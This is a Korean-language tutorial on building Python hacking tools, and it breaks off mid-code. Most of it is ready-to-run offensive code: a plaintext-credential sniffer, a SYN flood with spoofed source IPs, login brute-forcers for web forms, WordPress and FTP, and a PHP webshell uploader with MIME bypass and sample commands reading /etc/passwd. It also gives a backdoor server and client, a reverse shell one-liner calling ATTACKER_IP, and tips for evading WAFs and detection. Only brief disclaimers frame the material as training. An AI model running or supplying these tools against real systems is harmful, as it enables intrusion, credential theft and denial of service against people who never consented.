> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 파이썬 해킹 도구 개발 — 실전 30가지 예제

## 0. 초보자를 위한 개념 이해

### Python 해킹 도구란?

Python은 보안 분야에서 가장 많이 사용되는 프로그래밍 언어입니다. 간결한 문법, 풍부한 보안 라이브러리, 빠른 프로토타입 개발이 가능하여 취약점 스캐너, 익스플로잇 스크립트, 포렌식 도구 등 다양한 보안 도구를 직접 만들 수 있습니다.

**왜 배우는가:**
```
기존 도구의 한계:
  공개 도구:  기능이 정해져 있음, 탐지 시그니처 존재
  커스텀 도구: 필요한 기능만, 탐지 회피 가능

Python 해킹 도구 활용:
  네트워크 스캔   → 포트 스캐너, 서비스 핑거프린터
  웹 공격 자동화  → SQL Injection 자동 탐지, 브루트포스
  익스플로잇 작성 → 취약점 PoC 코드, CTF 문제 풀이
  악성코드 분석   → PE 분석기, PCAP 파서, 메모리 분석
  포렌식 자동화   → 해시 계산, 아티팩트 수집 스크립트

보안 업계 현실:
  침투 테스터, 보안 연구자, CTF 참가자 모두 Python 필수
  Metasploit도 내부적으로 Ruby, 보조 스크립트는 Python
```

### 핵심 개념 정리

```
Python 해킹 핵심 라이브러리:

  네트워크:
    socket   → 저수준 TCP/UDP 소켓 프로그래밍
    scapy    → 패킷 생성/캡처/분석 (해킹 스위스 아미 나이프)
    requests → HTTP 요청 자동화

  시스템:
    subprocess → 운영체제 명령어 실행
    os, pathlib → 파일시스템 조작
    ctypes     → Windows API 호출

  암호화/포렌식:
    hashlib  → MD5, SHA-256 등 해시 계산
    struct   → 바이너리 데이터 파싱 (PE, 패킷 헤더)
    zipfile  → ZIP/APK 파일 분석

  익스플로잇:
    pwntools → CTF/익스플로잇 전용 라이브러리
    paramiko → SSH 클라이언트 (원격 접속 자동화)
```

### 필요한 도구 및 환경
- **Python 3.10+**: 타입 힌트와 최신 문법 사용 — `python3 --version`으로 확인
- **가상 환경**: `python3 -m venv venv` → 프로젝트별 라이브러리 격리
- **보안 라이브러리**: `pip install scapy requests pwntools paramiko` — 핵심 4종

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""Python 해킹 도구 개발 기초 — 멀티스레드 TCP 배너 그래버."""
import socket
import concurrent.futures
from dataclasses import dataclass

@dataclass
class ServiceInfo:
    host: str
    port: int
    banner: str
    service: str = "unknown"

def grab_banner(host: str, port: int, timeout: float = 2.0) -> ServiceInfo:
    """TCP 배너 그래빙 — 서비스 버전 정보 수집."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((host, port))
            # HTTP 요청 전송 (웹 서버 배너 수집)
            if port in (80, 8080, 8000):
                sock.send(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
            banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
            service = detect_service(port, banner)
            return ServiceInfo(host, port, banner[:100], service)
    except (socket.timeout, ConnectionRefusedError, OSError):
        return ServiceInfo(host, port, "", "closed/filtered")

def detect_service(port: int, banner: str) -> str:
    """포트 번호와 배너로 서비스 타입 추정."""
    port_map: dict[int, str] = {
        22: "SSH", 23: "Telnet", 25: "SMTP", 80: "HTTP",
        110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
        3306: "MySQL", 5432: "PostgreSQL", 6379: "Redis",
        27017: "MongoDB", 3389: "RDP",
    }
    return port_map.get(port, "unknown")

def scan_services(host: str, ports: list[int]) -> list[ServiceInfo]:
    """멀티스레드 배너 그래빙."""
    results: list[ServiceInfo] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(grab_banner, host, p) for p in ports]
        for future in concurrent.futures.as_completed(futures):
            info = future.result()
            if info.banner:
                results.append(info)
                print(f"  [+] {info.port}/{info.service}: {info.banner[:50]}")
    return sorted(results, key=lambda x: x.port)

if __name__ == "__main__":
    target = "127.0.0.1"
    common_ports = [21, 22, 23, 25, 80, 110, 143, 443, 3306, 3389, 8080]
    print(f"[*] {target} 배너 그래빙")
    services = scan_services(target, common_ports)
    print(f"[*] 응답 서비스 {len(services)}개 발견")
```

---

## 1. 파이썬 기초 (해킹 관점)

### 모듈 구조

Python 해킹 도구의 기본 모듈 구조입니다. 기능별로 클래스와 함수를 분리하고 argparse로 CLI 인터페이스를 구성합니다.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# 표준 라이브러리
import socket
import os
import sys
import subprocess
import threading
import struct
import time

# 해킹 도구에서 자주 사용하는 라이브러리
# pip install requests scapy pwntools paramiko
import requests
from scapy.all import *
from pwn import *
import paramiko
```

### 클래스 기반 구조

`networkscanner` 클래스를 정의합니다. 관련 상태와 동작을 하나의 객체로 캡슐화하여 재사용성과 유지보수성을 높입니다.

```python
class NetworkScanner:
    def __init__(self, target, port_range=(1, 1024)):
        self.target = target
        self.start_port, self.end_port = port_range
        self.open_ports = []
    
    def scan_port(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((self.target, port))
            if result == 0:
                self.open_ports.append(port)
            s.close()
        except socket.error:
            pass
    
    def run(self):
        threads = []
        for port in range(self.start_port, self.end_port + 1):
            t = threading.Thread(target=self.scan_port, args=(port,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        return sorted(self.open_ports)

# 사용
scanner = NetworkScanner("192.168.1.1", (1, 1024))
print(scanner.run())
```

---

## 2. 네트워크 도구

### 예제 1: 포트 스캐너 (nmap 라이브러리)

Python `socket` 라이브러리를 사용한 멀티스레드 포트 스캐너입니다. TCP 연결 시도로 포트 개방 여부를 확인하며, `ThreadPoolExecutor`로 병렬 처리하여 스캔 속도를 높입니다.

```python
import nmap

def port_scan(target, ports="1-1024"):
    nm = nmap.PortScanner()
    nm.scan(target, ports)
    
    for host in nm.all_hosts():
        print(f"Host: {host} ({nm[host].hostname()})")
        print(f"State: {nm[host].state()}")
        
        for proto in nm[host].all_protocols():
            print(f"Protocol: {proto}")
            port_list = sorted(nm[host][proto].keys())
            
            for port in port_list:
                state = nm[host][proto][port]['state']
                service = nm[host][proto][port].get('name', 'unknown')
                version = nm[host][proto][port].get('version', '')
                print(f"  {port}/{proto} {state} {service} {version}")

port_scan("192.168.1.0/24", "22,80,443,3306,8080")
```

### 예제 2: TCP 포트 스캐너 (소켓)

Python `socket` 라이브러리를 사용한 멀티스레드 포트 스캐너입니다. TCP 연결 시도로 포트 개방 여부를 확인하며, `ThreadPoolExecutor`로 병렬 처리하여 스캔 속도를 높입니다.

```python
import socket
import threading
from queue import Queue

def scan_worker(q, results, lock):
    while not q.empty():
        host, port = q.get()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((host, port)) == 0:
                try:
                    banner = s.recv(1024).decode(errors='ignore').strip()
                except:
                    banner = ""
                with lock:
                    results.append((port, banner))
            s.close()
        except:
            pass
        finally:
            q.task_done()

def fast_port_scan(host, ports=range(1, 10001), threads=200):
    q = Queue()
    results = []
    lock = threading.Lock()
    
    for port in ports:
        q.put((host, port))
    
    for _ in range(min(threads, len(ports))):
        t = threading.Thread(target=scan_worker, args=(q, results, lock))
        t.daemon = True
        t.start()
    
    q.join()
    return sorted(results)

# 실행
print(f"[*] Scanning 192.168.1.1...")
open_ports = fast_port_scan("192.168.1.1", range(1, 1025))
for port, banner in open_ports:
    print(f"[+] Port {port} OPEN" + (f" | {banner[:50]}" if banner else ""))
```

### 예제 3: 패킷 스니퍼 (평문 자격증명 탈취)

소켓으로 네트워크 패킷을 수신하여 평문 자격증명을 탐지하는 스니퍼입니다. HTTP, FTP, Telnet 등 암호화되지 않은 프로토콜의 로그인 정보를 캡처합니다.

```python
import socket
import string

def packet_sniffer():
    HOST = socket.gethostbyname(socket.gethostname())
    
    # Raw 소켓 (관리자 권한 필요)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
    s.bind((HOST, 0))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)  # Windows
    
    keywords = ["USER", "PASS", "password", "login", "230 User logged in"]
    
    print("[*] Sniffing started... (Ctrl+C to stop)")
    while True:
        try:
            data = s.recvfrom(65565)
            raw = data[0]
            
            # 출력 가능한 문자만 파싱
            printable = set(string.printable)
            parsed = ''.join(chr(b) if chr(b) in printable else '.' 
                           for b in raw)
            
            for keyword in keywords:
                if keyword in parsed:
                    print(f"\n[!] Found keyword '{keyword}':")
                    print(parsed[:200])
                    break
        except KeyboardInterrupt:
            break
    
    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
    s.close()

packet_sniffer()
```

### 예제 4: TCP SYN Flood (DoS 공격 — 학습 및 방어 이해용)

TCP SYN Flood DoS 공격 원리를 Python으로 구현합니다. Raw 소켓으로 다량의 SYN 패킷을 전송하여 대상 서버의 연결 큐를 소진시킵니다.

```python
import socket
import struct
import random

def calculate_checksum(data):
    """체크섬 계산"""
    s = 0
    for i in range(0, len(data), 2):
        if i + 1 < len(data):
            w = (data[i] << 8) + data[i + 1]
        else:
            w = data[i] << 8
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def create_ip_header(src_ip, dst_ip):
    """IP 헤더 생성"""
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 40
    id = random.randint(0, 65535)
    flags_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_TCP
    checksum = 0
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    
    header = struct.pack('!BBHHHBBH4s4s',
                        version_ihl, tos, total_length, id, flags_offset,
                        ttl, protocol, checksum, src, dst)
    return header

def create_tcp_header(src_port, dst_port, src_ip, dst_ip):
    """TCP SYN 헤더 생성"""
    seq = random.randint(0, 2**32 - 1)
    ack = 0
    data_offset = (5 << 4)
    flags = 0x02  # SYN 플래그
    window = socket.htons(29200)
    checksum = 0
    urgent = 0
    
    # 가체크섬으로 실제 체크섬 계산
    tcp_header = struct.pack('!HHLLBBHHH',
                            src_port, dst_port, seq, ack,
                            data_offset, flags, window, checksum, urgent)
    
    # 유사 헤더 (체크섬 계산용)
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src, dst, 0, socket.IPPROTO_TCP, len(tcp_header))
    
    checksum = calculate_checksum(pseudo + tcp_header)
    
    tcp_header = struct.pack('!HHLLBBHHH',
                            src_port, dst_port, seq, ack,
                            data_offset, flags, window, checksum, urgent)
    return tcp_header

# 학습 목적: 실제 공격에 사용 금지
def syn_flood_demo(dst_ip, dst_port=80, count=10):
    """SYN Flood 데모 (허가된 환경에서만)"""
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    for i in range(count):
        # 랜덤 소스 IP (IP 스푸핑)
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        
        ip_header  = create_ip_header(src_ip, dst_ip)
        tcp_header = create_tcp_header(src_port, dst_port, src_ip, dst_ip)
        
        packet = ip_header + tcp_header
        s.sendto(packet, (dst_ip, 0))
        print(f"[{i+1}] Sent SYN from {src_ip}:{src_port} → {dst_ip}:{dst_port}")
    
    s.close()
```

---

## 3. 웹 해킹 자동화

### 예제 5: 웹 로그인 크래커 (딕셔너리 공격)

사전(dictionary) 파일의 패스워드 후보를 하나씩 시도하는 온라인 브루트포스 스크립트입니다. `requests` 라이브러리로 로그인 폼에 POST 요청을 보내고 응답 내용으로 성공 여부를 판단합니다.

```python
import requests

def web_login_crack(target_url, username, wordlist_path):
    """웹 로그인 딕셔너리 공격 (허가된 시스템에서만)"""
    
    session = requests.Session()
    
    # 로그인 성공 시 리다이렉트 URL (사전에 확인 필요)
    success_indicator = "dashboard"  # 성공 시 포함되는 키워드
    
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            password = line.strip()
            
            payload = {
                'username': username,
                'password': password,
                'submit': 'Login'
            }
            
            try:
                response = session.post(target_url, data=payload, 
                                       timeout=5, allow_redirects=True)
                
                if success_indicator in response.url or \
                   success_indicator in response.text:
                    print(f"[+] SUCCESS! Password: {password}")
                    return password
                else:
                    print(f"[-] Failed: {password}")
            
            except requests.exceptions.RequestException as e:
                print(f"[!] Error: {e}")
                continue
    
    print("[-] Password not found in wordlist")
    return None

# WordPress 특화
def wordpress_crack(site_url, username, wordlist_path):
    """WordPress 로그인 크래커"""
    login_url = f"{site_url}/wp-login.php"
    
    with open(wordlist_path, 'r', errors='ignore') as f:
        for password in f:
            password = password.strip()
            
            data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log+In',
                'redirect_to': '/wp-admin/',
                'testcookie': '1'
            }
            
            cookies = {'wordpress_test_cookie': 'WP+Cookie+check'}
            
            r = requests.post(login_url, data=data, cookies=cookies, 
                             allow_redirects=False)
            
            if 'wp-admin' in r.headers.get('Location', ''):
                print(f"[+] Found: {username}:{password}")
                return password
            else:
                print(f"[-] {password}")
```

### 예제 6: 웹 파일 업로드 공격

취약한 파일 업로드 기능을 통해 웹셸을 업로드하는 공격을 Python으로 구현합니다. Content-Type 우회와 확장자 필터 우회 기법을 포함합니다.

```python
import requests

def upload_webshell(upload_url, shell_path, shell_name="shell.php"):
    """파일 업로드 취약점으로 웹셸 업로드"""
    
    webshell_content = b'<?php system($_GET["cmd"]); ?>'
    
    # 파일 타입 헤더 조작 (MIME 우회)
    files = {
        'file': (shell_name, webshell_content, 'image/jpeg')
    }
    
    # Content-Type 우회 시도
    for content_type in ['image/jpeg', 'image/png', 'image/gif']:
        try:
            r = requests.post(upload_url, files=files)
            print(f"Status: {r.status_code}")
            print(f"Response: {r.text[:200]}")
        except Exception as e:
            print(f"Error: {e}")

def use_webshell(webshell_url, command):
    """업로드된 웹셸로 명령 실행"""
    r = requests.get(webshell_url, params={'cmd': command})
    return r.text

# 사용 예시
# use_webshell("http://target.com/uploads/shell.php", "id")
# use_webshell("http://target.com/uploads/shell.php", "cat /etc/passwd")
```

### 예제 7: 디렉토리 열거 (Directory Listing)

requests 라이브러리로 디렉토리 열거를 수행하는 Python 스크립트입니다. 워드리스트의 각 경로에 HTTP 요청을 보내 존재하는 디렉토리를 찾습니다.

```python
import requests
import threading
from queue import Queue

def directory_bruteforce(base_url, wordlist_path, threads=50, 
                         extensions=['', '.php', '.html', '.txt', '.bak']):
    """웹 디렉토리/파일 브루트포서"""
    
    q = Queue()
    found = []
    
    with open(wordlist_path, 'r') as f:
        for word in f:
            word = word.strip()
            for ext in extensions:
                q.put(word + ext)
    
    def worker():
        while not q.empty():
            path = q.get()
            url = f"{base_url}/{path}"
            
            try:
                r = requests.get(url, timeout=3, allow_redirects=False)
                if r.status_code == 200:
                    print(f"[200] {url}")
                    found.append(url)
                elif r.status_code in [301, 302]:
                    print(f"[{r.status_code}] {url} → {r.headers.get('Location', '')}")
                elif r.status_code == 403:
                    print(f"[403] {url} (Forbidden — exists but blocked)")
                    found.append(url)
            except:
                pass
            finally:
                q.task_done()
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    q.join()
    return found

# 사용
# found = directory_bruteforce("http://target.com", "/usr/share/wordlists/dirb/common.txt")
```

---

## 4. 백도어 및 리버스 쉘

### 예제 8: 백도어 서버 (피공격자 머신)

원격 명령 실행을 허용하는 백도어 서버 코드입니다. 공격 대상 머신에서 실행되며 공격자의 명령을 받아 결과를 반환합니다.

```python
# backdoor_server.py (공격 대상 머신에서 실행)
from socket import *

def backdoor_server(host='', port=11443):
    s = socket(AF_INET, SOCK_STREAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(10)
    
    print(f"[*] Listening on port {port}...")
    
    conn, addr = s.accept()
    print(f"[*] Connected from {addr}")
    
    while True:
        command = input("Enter command: ")
        conn.send(command.encode())
        
        if command.lower() == "quit":
            break
        
        response = conn.recv(4096).decode()
        print(response)
    
    conn.close()
    s.close()

backdoor_server()
```

### 예제 9: 백도어 클라이언트 (공격자 머신에서 제어)

백도어 서버에 연결하여 명령을 전송하고 결과를 받는 클라이언트입니다. 공격자 머신에서 실행되어 원격 시스템을 제어합니다.

```python
# backdoor_client.py (공격자 제어 머신에서 실행)
import socket
import subprocess

def backdoor_client(host, port=11443):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(b'[*] Connection Established!')
    
    while True:
        data = s.recv(1024).decode()
        
        if data.lower() == "quit":
            break
        
        # 명령어 실행
        proc = subprocess.Popen(
            data, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        
        stdout = proc.stdout.read()
        stderr = proc.stderr.read()
        s.send(stdout + stderr)
    
    s.close()

backdoor_client("192.168.1.100")
```

### 예제 10: Python 리버스 쉘 (한 줄 버전)

Python으로 구현한 리버스 쉘입니다. 대상 머신에서 실행되면 공격자의 리스너에 연결을 시도하여 명령 실행 채널을 엽니다.

```python
# 리버스 쉘 (대상 머신에서 실행)
# 공격자 머신: nc -lvnp 4444
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

---

## 5. FTP 크랙 (멀티스레드)

### 예제 11: FTP 브루트포서

ftplib로 FTP 서비스에 대해 브루트포스 공격을 수행합니다. 워드리스트의 각 비밀번호를 시도하여 유효한 자격증명을 찾습니다.

```python
import ftplib
import threading
from queue import Queue

class FTPCracker:
    def __init__(self, host, user, wordlist, threads=10):
        self.host = host
        self.user = user
        self.wordlist = wordlist
        self.threads = threads
        self.found = False
        self.password = None
        self.q = Queue()
    
    def try_login(self, password):
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, 21, timeout=5)
            ftp.login(self.user, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except Exception:
            return False
    
    def worker(self):
        while not self.q.empty() and not self.found:
            password = self.q.get()
            
            if self.try_login(password):
                self.found = True
                self.password = password
                print(f"[+] SUCCESS! {self.user}:{password}")
            else:
                print(f"[-] {password}")
            
            self.q.task_done()
    
    def run(self):
        with open(self.wordlist, 'r', errors='ignore') as f:
            for line in f:
                self.q.put(line.strip())
        
        thread_list = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        self.q.join()
        return self.password

# cracker = FTPCracker("192.168.1.100", "admin", "wordlist.txt", threads=20)
# cracker.run()
```

---

## 6. 레지스트리 및 시스템 해킹

### 예제 12: 레지스트리 사용자 목록 추출

Windows 레지스트리에서 사용자 계정 목록을 추출합니다. winreg 모듈로 SAM 하이브의 사용자 정보에 접근합니다.

```python
import winreg  # Windows 전용

def get_registry_users():
    """레지스트리에서 사용자 목록 추출"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
        )
        
        i = 0
        users = []
        while True:
            try:
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                
                try:
                    profile_path = winreg.QueryValueEx(subkey, "ProfileImagePath")[0]
                    username = profile_path.split("\\")[-1]
                    users.append({
                        'SID': subkey_name,
                        'Username': username,
                        'Path': profile_path
                    })
                except WindowsError:
                    pass
                
                winreg.CloseKey(subkey)
                i += 1
            except WindowsError:
                break
        
        winreg.CloseKey(key)
        return users
    
    except Exception as e:
        print(f"Error: {e}")
        return []

# users = get_registry_users()
# for u in users:
#     print(f"SID: {u['SID']}, User: {u['Username']}")
```

### 예제 13: 방화벽 레지스트리 확인

Windows 레지스트리에서 방화벽 설정을 확인합니다. 방화벽 비활성화 여부와 예외 규칙을 파악합니다.

```python
import winreg

def check_firewall_status():
    """Windows 방화벽 상태 레지스트리로 확인"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile"
        )
        
        enabled = winreg.QueryValueEx(key, "EnableFirewall")[0]
        print(f"Firewall Enabled: {bool(enabled)}")
        
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Error: {e}")

check_firewall_status()
```

---

## 7. 퍼징 (Fuzzing)

### 예제 14: 기본 퍼저

버퍼 오버플로우 취약점을 탐지하는 기본 퍼저입니다. 점점 길어지는 입력값을 전송하여 애플리케이션이 비정상 종료되는 시점을 찾습니다.

```python
# 버퍼 오버플로우 취약점 탐지용 퍼저
import socket
import time

def fuzzer(host, port, payload_size=100, increment=100, max_size=10000):
    """TCP 서비스 퍼저"""
    
    size = payload_size
    
    while size <= max_size:
        try:
            payload = b"A" * size
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            
            # 배너 수신
            banner = s.recv(1024)
            
            # 페이로드 전송
            s.send(payload)
            
            try:
                response = s.recv(1024)
                print(f"[*] Sent {size} bytes - Server responded")
            except:
                print(f"[!] Sent {size} bytes - No response (possible crash!)")
            
            s.close()
            time.sleep(0.1)
        
        except ConnectionRefusedError:
            print(f"[CRASH?] {size} bytes sent — Connection refused!")
            print("[!] Server may have crashed!")
            break
        except Exception as e:
            print(f"[!] {size} bytes — Error: {e}")
            break
        
        size += increment

# fuzzer("192.168.1.100", 21, payload_size=200, increment=200)
```

### 예제 15: 바이너리 퍼저 (파일 기반)

파일 기반 바이너리 퍼저입니다. 정상 파일을 변형(bit flip, byte substitution)하여 파서 취약점을 탐지합니다.

```python
import os
import random
import subprocess

def file_fuzzer(target_binary, seed_file, iterations=1000):
    """파일 파서 취약점 탐지 퍼저"""
    
    with open(seed_file, 'rb') as f:
        seed_data = bytearray(f.read())
    
    for i in range(iterations):
        # 랜덤 변이
        fuzzed = bytearray(seed_data)
        
        # 변이 전략 선택
        strategy = random.choice(['bit_flip', 'byte_replace', 'insert', 'delete'])
        
        if strategy == 'bit_flip' and fuzzed:
            idx = random.randint(0, len(fuzzed) - 1)
            fuzzed[idx] ^= (1 << random.randint(0, 7))
        
        elif strategy == 'byte_replace' and fuzzed:
            idx = random.randint(0, len(fuzzed) - 1)
            fuzzed[idx] = random.randint(0, 255)
        
        elif strategy == 'insert':
            idx = random.randint(0, len(fuzzed))
            fuzzed.insert(idx, random.randint(0, 255))
        
        elif strategy == 'delete' and len(fuzzed) > 1:
            idx = random.randint(0, len(fuzzed) - 1)
            del fuzzed[idx]
        
        # 임시 파일 저장
        fuzz_file = f"/tmp/fuzz_{i}.bin"
        with open(fuzz_file, 'wb') as f:
            f.write(fuzzed)
        
        # 대상 프로그램 실행
        try:
            result = subprocess.run(
                [target_binary, fuzz_file],
                timeout=5,
                capture_output=True
            )
            
            # 크래시 탐지 (시그널로 종료)
            if result.returncode < 0:
                print(f"[CRASH!] Iteration {i}: returncode={result.returncode}")
                print(f"  Fuzz file saved: {fuzz_file}")
                # 크래시 파일은 보존
                continue
        
        except subprocess.TimeoutExpired:
            print(f"[HANG?] Iteration {i}: Timeout")
        
        except Exception as e:
            print(f"[ERROR] Iteration {i}: {e}")
        
        # 크래시 아니면 임시 파일 삭제
        if os.path.exists(fuzz_file):
            os.remove(fuzz_file)
        
        if i % 100 == 0:
            print(f"Progress: {i}/{iterations}")

# file_fuzzer("./vulnerable_parser", "sample.pdf")
```

---

## 8. API 후킹 (Windows)

### 예제 16: Message Hook (키로거 원리)

Windows Message Hook을 이용한 키로거 구현 원리입니다. 시스템 전역 메시지 훅으로 키보드 입력을 캡처합니다.

```python
# pywin32 필요: pip install pywin32
import win32api
import win32con
import win32gui
import ctypes

# 키로거 원리 이해용 코드
class KeyLogger:
    def __init__(self):
        self.log = []
        
    def _low_level_handler(self, nCode, wParam, lParam):
        """키보드 훅 콜백"""
        if wParam == win32con.WM_KEYDOWN:
            vk_code = lParam[0]
            key = chr(vk_code) if 32 <= vk_code < 128 else f"[{vk_code}]"
            self.log.append(key)
            print(f"Key: {key}", end="", flush=True)
        
        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, ctypes.byref(ctypes.c_void_p(lParam)))
    
    def start(self):
        """키보드 훅 시작 (개념 이해용)"""
        print("[*] Keylogger started (Press Ctrl+C to stop)")
        # 실제 구현은 SetWindowsHookEx 사용
        # 이 코드는 개념 이해를 위한 구조만 표현
```

---

## 9. 암호화/복호화

### 예제 17: XOR 암호화 (간단한 난독화)

XOR 암호화를 Python으로 구현합니다. 악성코드에서 탐지 회피를 위한 단순 난독화에 자주 사용되는 기법입니다.

```python
def xor_encrypt(data, key):
    """XOR 암호화/복호화 (같은 키로 역연산 가능)"""
    if isinstance(data, str):
        data = data.encode()
    if isinstance(key, str):
        key = key.encode()
    
    return bytes([d ^ key[i % len(key)] for i, d in enumerate(data)])

def xor_decrypt(encrypted, key):
    """XOR 복호화 (암호화와 동일)"""
    return xor_encrypt(encrypted, key)

# 사용
plaintext = "Hello, World! This is secret."
key = "secretkey"

encrypted = xor_encrypt(plaintext, key)
print(f"Encrypted: {encrypted.hex()}")

decrypted = xor_decrypt(encrypted, key).decode()
print(f"Decrypted: {decrypted}")
```

### 예제 18: Base64 인코딩/디코딩 (페이로드 우회)

Base64 인코딩/디코딩을 활용한 페이로드 우회 기법입니다. 방화벽이나 WAF의 시그니처 탐지를 피하기 위해 페이로드를 인코딩합니다.

```python
import base64

# 셸코드/페이로드 Base64 인코딩으로 WAF 우회
payload = "whoami"
encoded = base64.b64encode(payload.encode()).decode()
print(f"Encoded: {encoded}")  # d2hvYW1p

# 디코딩 후 실행
decoded = base64.b64decode(encoded).decode()
print(f"Decoded: {decoded}")

# 다중 인코딩 (WAF 우회)
double_encoded = base64.b64encode(
    base64.b64encode(payload.encode())
).decode()
print(f"Double encoded: {double_encoded}")

# URL 안전 Base64
url_safe = base64.urlsafe_b64encode(payload.encode()).decode()
print(f"URL-safe: {url_safe}")
```

---

## 10. 통합 해킹 프레임워크 구조

여러 해킹 기능을 통합한 프레임워크 구조입니다. 정찰, 익스플로잇, 후속 공격 모듈을 플러그인 방식으로 확장할 수 있습니다.

```python
#!/usr/bin/env python3
"""
모의해킹 자동화 프레임워크 (Python 3.10+)
용도: 정찰 → 스캔 → 취약점 분석 → 보고서 생성 파이프라인 구조화
사용법: python3 pentest_framework.py <target> [--phase recon|scan|all]
의존성: pip install requests dnspython
"""
from __future__ import annotations
import argparse
import json
import socket
import sys
import threading
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from queue import Queue
from typing import Callable


# ─── 데이터 모델 ────────────────────────────────────────────────

@dataclass
class Finding:
    phase: str
    severity: str    # CRITICAL / HIGH / MEDIUM / LOW / INFO
    title: str
    detail: str
    evidence: str = ""

    def __str__(self) -> str:
        return f"[{self.severity:8s}] {self.title}: {self.detail}"


@dataclass
class EngagementResult:
    target: str
    start_time: str = field(default_factory=lambda: datetime.now().isoformat())
    end_time: str = ""
    open_ports: list[tuple[int, str]] = field(default_factory=list)
    dns_records: dict[str, list[str]] = field(default_factory=dict)
    findings: list[Finding] = field(default_factory=list)

    def add_finding(self, *args, **kwargs) -> None:
        self.findings.append(Finding(*args, **kwargs))

    def summary(self) -> dict:
        counts: dict[str, int] = defaultdict(int)
        for f in self.findings:
            counts[f.severity] += 1
        return dict(counts)


# ─── 정찰 모듈 ──────────────────────────────────────────────────

def recon_dns(target: str, result: EngagementResult) -> None:
    """DNS 레코드 수집 (A, MX, NS, TXT)."""
    try:
        import dns.resolver  # pip install dnspython
        for rtype in ("A", "MX", "NS", "TXT"):
            try:
                answers = dns.resolver.resolve(target, rtype, lifetime=5)
                result.dns_records[rtype] = [str(r) for r in answers]
            except Exception:
                pass
        if result.dns_records:
            result.add_finding("RECON", "INFO", "DNS 레코드 수집",
                               f"{target}", json.dumps(result.dns_records))
    except ImportError:
        # dnspython 없을 때 기본 조회
        try:
            ip = socket.gethostbyname(target)
            result.dns_records["A"] = [ip]
            result.add_finding("RECON", "INFO", "DNS A 레코드", target, ip)
        except socket.gaierror:
            pass


def recon_whois(target: str, result: EngagementResult) -> None:
    """Whois 조회 (python-whois 있을 때)."""
    try:
        import whois  # pip install python-whois
        w = whois.whois(target)
        detail = f"등록자: {w.registrant_name}  등록일: {w.creation_date}"
        result.add_finding("RECON", "INFO", "Whois 조회", target, detail)
    except Exception:
        pass


# ─── 스캔 모듈 ──────────────────────────────────────────────────

def scan_ports(
    target: str,
    result: EngagementResult,
    ports: list[int] | None = None,
    n_threads: int = 200,
    timeout: float = 0.8,
) -> None:
    """멀티스레드 TCP 포트 스캐너."""
    port_list = ports or list(range(1, 1025))
    q: Queue[int] = Queue()
    for p in port_list:
        q.put(p)
    lock = threading.Lock()

    def worker() -> None:
        while not q.empty():
            port = q.get()
            try:
                with socket.create_connection((target, port), timeout=timeout) as s:
                    banner = b""
                    try:
                        s.settimeout(0.5)
                        banner = s.recv(256)
                    except Exception:
                        pass
                    svc = banner.decode("utf-8", errors="replace").strip()[:50]
                    with lock:
                        result.open_ports.append((port, svc))
            except (socket.timeout, ConnectionRefusedError, OSError):
                pass
            finally:
                q.task_done()

    threads = [threading.Thread(target=worker, daemon=True)
